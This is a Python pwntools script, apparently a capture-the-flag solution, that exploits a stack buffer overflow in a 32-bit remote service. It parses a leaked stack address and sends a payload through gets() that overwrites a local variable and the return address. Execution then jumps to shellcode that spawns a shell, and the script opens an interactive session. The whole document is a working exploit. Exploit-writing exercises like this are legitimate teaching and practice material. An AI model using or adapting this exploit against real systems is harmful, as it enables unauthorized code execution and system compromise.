#!/usr/bin/env python3
import re
from pwn import *

# set and load target program
p = remote('*server_ip*', 31051)

# receive the first printed bytes
print_info_byte = p.recv()
print_info_str = print_info_byte.decode('utf-8', 'ignore')

# find address of s by regex (find 0xXXX... in print_info_str)
pattern = r'0x[0-9a-fA-F]+'
match = re.search(pattern, print_info_str)
s_address = int(match.group(0), 16)
print('address of s:', hex(s_address))

# construct shellcode for 32-bit
shellcode = asm(shellcraft.sh())

# rewrite the value of return address (s address is ebp-72, return address is ebp+4)
ret_offset = 76
return_address = p32(s_address + ret_offset + 4)

# rewrite value of v5 to what we need
v5_offset = 64
v5_value = p32(0xDEADBEEF)

# construct payload, remember to add \n for gets()
payload = b'A'*v5_offset  + v5_value + b'A'*(ret_offset-v5_offset-4) + return_address + shellcode + b'\n'

# send payload
p.sendline(payload)

# get interactive shell
p.interactive()